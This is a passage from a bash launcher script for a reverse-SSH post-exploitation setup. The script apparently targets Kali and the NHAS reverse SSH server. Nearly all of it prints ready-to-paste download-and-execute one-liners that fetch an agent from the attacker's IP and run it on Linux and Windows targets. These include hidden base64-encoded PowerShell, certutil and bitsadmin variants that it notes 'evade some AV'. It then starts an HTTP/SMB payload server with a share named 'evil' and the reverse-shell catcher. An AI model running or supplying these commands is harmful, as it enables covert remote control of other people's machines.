echo "  ${YELLOW}wget http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT} -O /tmp/${LINUX_AGENT} && chmod +x /tmp/${LINUX_AGENT} && /tmp/${LINUX_AGENT}${LINUX_CONNECT}${NC}"
echo ""
echo "  ${CYAN}# 6. curl -> /tmp/${LINUX_AGENT} (persistent copy)${NC}"
echo "  ${YELLOW}curl -so /tmp/${LINUX_AGENT} http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT} && chmod +x /tmp/${LINUX_AGENT} && /tmp/${LINUX_AGENT}${LINUX_CONNECT}${NC}"
echo ""
echo "  ${CYAN}# 7. wget -> current dir (writable dir, no /tmp access)${NC}"
echo "  ${YELLOW}wget http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT} -O ./${LINUX_AGENT} && chmod +x ./${LINUX_AGENT} && ./${LINUX_AGENT}${LINUX_CONNECT}${NC}"
echo ""
echo "  ${CYAN}# 8. wget -> current dir (base64 one-liner)${NC}"
echo "  ${GRAY}\$(echo ${L_WGET_CWD_B64}|base64 -d|sh)${NC}"
echo ""
echo "  ${CYAN}# 9. curl -> current dir (writable dir, no /tmp access)${NC}"
echo "  ${YELLOW}curl -so ./${LINUX_AGENT} http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT} && chmod +x ./${LINUX_AGENT} && ./${LINUX_AGENT}${LINUX_CONNECT}${NC}"
echo ""
echo "  ${CYAN}# 10. curl -> current dir (base64 one-liner)${NC}"
echo "  ${GRAY}\$(echo ${L_CURL_CWD_B64}|base64 -d|sh)${NC}"
echo ""
echo "  ${CYAN}# 11. busybox wget -> /tmp${NC}"
echo "  ${GRAY}f=/tmp/.\$\$;busybox wget -qO \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f${NC}"
echo ""
echo "  ${CYAN}# 12. fetch -> /tmp (FreeBSD)${NC}"
echo "  ${DIM}f=/tmp/.\$\$;fetch -qo \$f http://${TUN0_IP}:${HTTP_PORT}/${LINUX_AGENT}&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f${NC}"
echo ""
echo "  ${CYAN}# 13. nc (serve: nc -lvnp ${HTTP_PORT} < ${LINUX_AGENT} on Kali)${NC}"
echo "  ${DIM}f=/tmp/.\$\$;nc ${TUN0_IP} ${HTTP_PORT} > \$f&&chmod +x \$f&&\$f${LINUX_CONNECT};rm -f \$f${NC}"
echo ""

# =========================================================================
# WINDOWS AGENT COMMANDS
# All command lines use printf '%s\n' so \n \e in paths are NEVER interpreted
# =========================================================================
echo "${BOLD}=============================================="
echo "  WINDOWS AGENT COMMANDS  [ ${WIN_AGENT} ]$([ -z "$WIN_CONNECT" ] && echo "  ${GRAY}direct - no args needed${NC}" || echo "  ${GRAY}non-direct - embeds -d ${TUN0_IP}:${PORT}${NC}")"
echo "==============================================${NC}"
echo ""

if [[ "$_WIN_DIRECT_BUILT" == "true" ]]; then
    echo "  ${GREEN}[+] TEMP DIRECT AGENT (auto-built, no -d needed, served by NHAS):${NC}"
    printf "  ${YELLOW}%s${NC}\n" "iwr -Uri 'http://${TUN0_IP}:${HTTP_PORT}/nhasWinAmd64Direct.exe' -OutFile .\nhasWinAmd64Direct.exe; .\nhasWinAmd64Direct.exe"
    printf "  ${YELLOW}%s${NC}\n" "\\\\${TUN0_IP}\\evil\\nhasWinAmd64Direct.exe"
    echo ""
fi

echo "  ${CYAN}# 1. SMB fileless (most reliable, no disk write)${NC}"
printf "  ${YELLOW}%s${NC}\n" "${WIN_UNC}${WIN_CONNECT}"
echo ""

echo "  ${CYAN}# 2. SMB copy -> C:\Windows\Temp (persistent)${NC}"
printf "  ${YELLOW}%s${NC}\n" "copy ${WIN_UNC} ${WIN_TEMP}; ${WIN_TEMP_EXEC}"
echo ""

echo "  ${CYAN}# 3. SMB copy -> Temp (unicode base64, Evil-WinRM)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -NoP -NonI -W Hidden -Enc ${PS_SMB_B64}"
echo ""

echo "  ${CYAN}# 4. IWR -> current folder (drop-in, no path needed)${NC}"
printf "  ${YELLOW}%s${NC}\n" "${PS_IWR_CWD}"
echo ""

echo "  ${CYAN}# 5. IWR current folder (unicode base64, Evil-WinRM)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -NoP -NonI -W Hidden -Enc ${PS_IWR_CWD_B64}"
echo ""

echo "  ${CYAN}# 6. IWR -> C:\Windows\Temp (standard)${NC}"
printf "  ${YELLOW}%s${NC}\n" "${PS_IWR_TEMP}"
echo ""

echo "  ${CYAN}# 7. IWR -> Temp persistent (unicode base64, Evil-WinRM)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -ep bypass -enc ${PS_PERM_B64}"
echo ""

echo "  ${CYAN}# 8. IWR random filename (unicode base64, avoids quote issues)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -NoP -NonI -W Hidden -Enc ${PS_IWR_RND_B64}"
echo ""

echo "  ${CYAN}# 9. IWR hidden + self-delete (unicode base64, stealth)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -ep bypass -W hidden -enc ${PS_HID_B64}"
echo ""

echo "  ${CYAN}# 10. New-Object Net.WebClient -> Temp (widest PS compat, PS 2.0+)${NC}"
printf "  ${YELLOW}%s${NC}\n" "powershell -ep bypass -c \"${PS_WEBCLIENT}\""
echo ""

echo "  ${CYAN}# 11. New-Object Net.WebClient (unicode base64, PS 2.0+, no quotes)${NC}"
printf "  ${GRAY}%s${NC}\n" "powershell -NoP -NonI -W Hidden -Enc ${PS_WEBCLIENT_B64}"
echo ""

echo "  ${CYAN}# 12. certutil -> C:\Windows\Temp (old systems, no PS needed)${NC}"
printf "  ${GRAY}%s${NC}\n" "cmd /c \"set r=%RANDOM%&certutil -urlcache -split -f http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT} C:\\Windows\\Temp\\%r%.exe&C:\\Windows\\Temp\\%r%.exe${WIN_CONNECT}\""
echo ""

echo "  ${CYAN}# 13. curl.exe -> C:\Windows\Temp (Windows 10+, cmd-safe)${NC}"
printf "  ${LGRAY}%s${NC}\n" "cmd /c \"set r=%RANDOM%&curl -so C:\\Windows\\Temp\\%r%.exe http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT}&C:\\Windows\\Temp\\%r%.exe${WIN_CONNECT}\""
echo ""

echo "  ${CYAN}# 14. bitsadmin -> C:\Windows\Temp (background, evades some AV)${NC}"
printf "  ${GRAY}%s${NC}\n" "cmd /c \"set r=%RANDOM%&bitsadmin /transfer j http://${TUN0_IP}:${HTTP_PORT}/${WIN_AGENT} C:\\Windows\\Temp\\%r%.exe&C:\\Windows\\Temp\\%r%.exe${WIN_CONNECT}\""
echo ""

echo ""
echo "${BOLD}=============================================="
echo "  QUICK CONNECT EXAMPLES"
echo "==============================================${NC}"
echo ""
echo "  ${CYAN}# Open catcher console${NC}"
echo "  ${YELLOW}ssh rssh${NC}"
echo ""
echo "  ${CYAN}# Linux target${NC}"
echo "  ${YELLOW}ssh -J rssh <id>${NC}"
echo ""
echo "  ${CYAN}# Windows target  (always -tt to avoid ConPTY buffer issue)${NC}"
echo "  ${YELLOW}ssh -tt -J rssh <id>${NC}"
echo "  ${YELLOW}  \$b=\$host.UI.RawUI.BufferSize;\$b.Width=220;\$b.Height=9999;\$host.UI.RawUI.BufferSize=\$b;\$w=\$host.UI.RawUI.WindowSize;\$w.Width=220;\$w.Height=50;\$host.UI.RawUI.WindowSize=\$w${NC}  ${GRAY}# PS${NC}"
echo ""
echo "  ${CYAN}# Example - replace id with yours from: ssh rssh -> ls -t${NC}"
echo "  ${GREEN}ssh    -J rssh langeidvanrssh${NC}    ${GRAY}# Linux${NC}"
echo "  ${GREEN}ssh -tt -J rssh langeidvanrssh${NC}   ${GRAY}# Windows${NC}"
echo ""

# ─── Launch file server (tools.py via nhas-tools.sh) ─────────────────────────
TOOLS_PID=""
if [[ -f "$TOOLS_SCRIPT" ]]; then
    echo "${GREEN}[+]${NC} Starting file server → HTTP :${HTTP_PORT}  SMB :445  (share: evil)"
    bash "$TOOLS_SCRIPT" "$EXPLOIT_DIR" "$HTTP_PORT" &
    TOOLS_PID=$!
    sleep 0.5
    if ! kill -0 "$TOOLS_PID" 2>/dev/null; then
        echo "${RED}[!]${NC} File server exited immediately — check tools.py / python3 output above"
        TOOLS_PID=""
    else
        echo "${GREEN}[+]${NC} File server running (PID ${TOOLS_PID})"
    fi
else
    echo "${YELLOW}[!]${NC} nhas-tools.sh not found at ${TOOLS_SCRIPT}"
    echo "    Start manually in another terminal:"
    echo "    ${YELLOW}python3 -m http.server ${HTTP_PORT} -d ${EXPLOIT_DIR}${NC}"
    echo "    ${YELLOW}impacket-smbserver evil ${EXPLOIT_DIR} -smb2support${NC}"
fi
echo ""

cd "$DATA_DIR" || exit 1
"$SERVER_BIN" --datadir . --enable-client-downloads --external_address "${TUN0_IP}:${PORT}" "0.0.0.0:${DEFAULT_PORT}"